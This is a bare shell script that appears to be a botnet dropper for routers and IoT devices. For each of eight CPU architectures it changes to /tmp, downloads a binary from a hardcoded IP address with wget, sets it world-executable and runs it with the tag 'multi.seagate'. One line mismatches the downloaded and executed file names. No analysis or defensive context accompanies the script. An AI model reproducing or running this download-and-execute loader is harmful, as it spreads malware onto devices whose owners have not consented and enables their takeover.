#!/bin/sh

ip="45.95.146.126"
bins="bins"

cd /tmp; rm -rf x86; wget http://$ip/$bins/nabx86; chmod 777 nabx86; ./nabx86 multi.seagate
cd /tmp; rm -rf arm7; wget http://$ip/$bins/nabarm7; chmod 777 nabarm7; ./nabarm7 multi.seagate
cd /tmp; rm -rf arm5; wget http://$ip/$bins/arm5; chmod 777 nabarm5; ./nabarm5 multi.seagate
cd /tmp; rm -rf arm; wget http://$ip/$bins/nabarm; chmod 777 nabarm; ./nabarm multi.seagate
cd /tmp; rm -rf mips; wget http://$ip/$bins/nabmips; chmod 777 nabmips; ./nabmips multi.seagate
cd /tmp; rm -rf mpsl; wget http://$ip/$bins/nabmpsl; chmod 777 nabmpsl; ./nabmpsl multi.seagate
cd /tmp; rm -rf sh4; wget http://$ip/$bins/nabsh4; chmod 777 nabsh4; ./nabsh4 multi.seagate
cd /tmp; rm -rf ppc; wget http://$ip/$bins/nabppc; chmod 777 nabppc; ./nabppc multi.seagate
